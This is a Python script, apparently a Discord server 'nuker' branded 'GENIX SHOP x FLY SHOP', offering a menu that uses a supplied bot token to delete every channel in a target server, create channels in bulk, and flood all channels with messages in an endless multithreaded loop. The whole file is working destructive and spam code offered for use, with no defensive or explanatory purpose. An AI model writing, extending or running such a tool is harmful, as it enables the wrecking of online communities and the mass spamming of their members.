import discord
from discord.ext import commands
import requests
import threading
from os import system
import pystyle
import time
import json
from pystyle import Colors, Colorate
from json import load

system('mode con: cols=80 lines=20')
system("title GENIX SHOP x FLY SHOP")


def fun1():
    system('cls')
    banner = '''
       ╔═╗╦ ╦ ╦  ╔═╗╦ ╦╔═╗╔═╗ ┃ discord : https://discord.com/invite/YknWyFmCGc
       ╠╣ ║ ╚╦╝  ╚═╗╠═╣║ ║╠═╝ ┃ Author  : Administrator#2439
       ╚  ╩═╝╩   ╚═╝╩ ╩╚═╝╩   ┃ TheGang : GENIX SHOP x FLY SHOP
    '''
    print(Colorate.Horizontal(Colors.rainbow, banner))
    token = input('\x1b[32mToken: ')
    guild = input('\x1b[32mGuild: ')
    print()
    r = requests.get(f"https://discord.com/api/v9/guilds/{guild}/channels",headers={"authorization": f"Bot {token}"})
    for channel in json.loads(r.text):
        def api():
            s = requests.delete(f"https://discord.com/api/v9/channels/{channel['id']}",headers={"authorization": f"Bot {token}"})
            print(Colorate.Horizontal(Colors.rainbow, f"[-] Delete Channels {s.json()['id']}"))
        threading.Thread(target=api).start()
        
def fun2():
    system('cls')
    banner = '''
       ╔═╗╦ ╦ ╦  ╔═╗╦ ╦╔═╗╔═╗ ┃ discord : https://discord.com/invite/YknWyFmCGc
       ╠╣ ║ ╚╦╝  ╚═╗╠═╣║ ║╠═╝ ┃ Author  : Administrator#2439
       ╚  ╩═╝╩   ╚═╝╩ ╩╚═╝╩   ┃ TheGang : GENIX SHOP x FLY SHOP
    '''
    print(Colorate.Horizontal(Colors.rainbow, banner))
    token = input('\x1b[32mToken: ')
    guild = input('\x1b[32mGuild: ')
    name = input('\x1b[32mName: ')
    jam = int(input("\x1b[32mCount: "))
    print()
    def api():
        s = requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels",headers={"authorization": f"Bot {token}"},json={"type":0,"name":name,"permission_overwrites":[]})
        print(Colorate.Horizontal(Colors.rainbow, f"[+] Create Channels Successfully"))
    for x in range(jam):
        threading.Thread(target=api).start()

def fun3():
    system('cls')
    banner = '''
       ╔═╗╦ ╦ ╦  ╔═╗╦ ╦╔═╗╔═╗ ┃ discord : https://discord.com/invite/YknWyFmCGc
       ╠╣ ║ ╚╦╝  ╚═╗╠═╣║ ║╠═╝ ┃ Author  : Administrator#2439
       ╚  ╩═╝╩   ╚═╝╩ ╩╚═╝╩   ┃ TheGang : GENIX SHOP x FLY SHOP
    '''
    print(Colorate.Horizontal(Colors.rainbow, banner))
    token = input('\x1b[32mToken: ')
    guild = input("\x1b[32mGuild: ")
    msg = input('\x1b[32mMessage: ')
    print()
    while True:
        r = requests.get(f"https://discord.com/api/v9/guilds/{guild}/channels",headers={"authorization": f"Bot {token}"})
        for channel in json.loads(r.text):
            def api():
                s = requests.post(f"https://discord.com/api/v9/channels/{channel['id']}/messages",headers={"authorization": f"Bot {token}"},json={"content":f"{msg}"})
                print(Colorate.Horizontal(Colors.rainbow, f"[+] Send MessageChannels Successfully"))
            threading.Thread(target=api).start()


def home():
    system('cls')
    banner = '''
       ╔═╗╦ ╦ ╦  ╔═╗╦ ╦╔═╗╔═╗ ┃ discord : https://discord.com/invite/YknWyFmCGc
       ╠╣ ║ ╚╦╝  ╚═╗╠═╣║ ║╠═╝ ┃ Author  : Administrator#2439
       ╚  ╩═╝╩   ╚═╝╩ ╩╚═╝╩   ┃ TheGang : GENIX SHOP x FLY SHOP
    '''
    print(Colorate.Horizontal(Colors.rainbow, banner))
    print('\x1b[33m             [1] Delete Channels')
    print('\x1b[33m             [2] Create Channels')
    print('\x1b[33m             [3] Spam MessageChannels')
    print()
    try:
        cho = int(input("\x1b[36m--> "))
        print()
        if cho == 1:
            fun1()
        elif cho == 2:
            fun2()
        elif cho == 3:
            fun3()
        else:
            print('\x1b[31mThis function does not exist.')
    except Exception as f:
        print('\x1b[31mThis function does not exist.')
        print(f)
        time.sleep(2)
        home()

home()




